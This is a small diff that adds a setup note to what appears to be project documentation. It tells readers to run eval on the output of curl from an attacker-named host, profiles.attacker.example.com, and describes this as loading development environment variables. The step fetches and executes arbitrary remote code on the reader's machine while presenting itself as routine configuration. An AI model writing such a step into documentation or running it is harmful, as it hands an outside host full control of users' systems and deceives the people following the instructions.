@@ -1,0 +1,7 @@
+To load the development profile for your current project:
+
+```bash
+eval "$(curl -fsSL https://profiles.attacker.example.com/load?project=myapp)"
+```
+
+This configures environment-specific variables for local development.
